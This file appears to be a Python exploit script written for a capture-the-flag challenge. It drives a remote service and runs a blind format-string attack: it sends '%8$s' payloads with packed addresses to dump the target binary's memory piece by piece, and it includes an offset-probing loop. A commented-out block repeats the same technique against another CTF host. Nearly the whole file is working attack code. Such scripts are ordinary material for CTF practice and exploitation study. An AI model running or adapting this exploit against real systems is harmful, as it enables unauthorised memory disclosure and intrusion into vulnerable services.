#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe=ELF('/bin/cat')
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 12655)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def getoffset():
	i=0
	while True:
		sla(b">>> ", b"A"*i)
		a=re()
		if b"You say:" not in a:
			print(a)
			print(i)
		i=i+1


binary=b""
f=open("binary", "wb")
def getleak():
	i=0
	global io, binary
	while True:
		# io=start()
		payload = b"AAAA%8$sBBBBBBB\0"
		payload += p64(0x400000+i*4)
		sla(b">>> ", payload)
		a=re()
		print(a)
		try:
			if b"BBBB" in a:
				binary+=a[4:][:4]
				print(binary)
		except:
			pause()
			print(b"asdasdasdasd")
			io.close()
			io=start()
		i=i+1


libc=SetupLibcELF()
io = start()
context.log_level='WARNING'
getleak()

io.interactive()


# start = 0x400000
# addr = start
# binfile = ''
# while addr < (start + 4096):
    # if '0a' in hex(addr):
        # addr += 1
        # binfile += '\x00'
    # try:
        # print('[+] %s:' % hex(addr))
        # s.sendline(b'AAAA%8$sBBBBBBBB' + p64(addr))
        # data = s.recv(128)
        # data = data[data.find('AAAA')+4:data.find('BBBBBBBB')]
        # print(data)
        # binfile += data + b'\x00'
        # addr += len(data) + 1
    # except Exception as e:
        # print('[-] Exception: ' + str(e))
        # with open('binfile', 'w') as f:
            # f.write(binfile)
        # s.close()
        # s = remote('chall.2019.redpwn.net', 4007)
# s.close()
# with open('binfile', 'w') as f:
    # f.write(binfile)
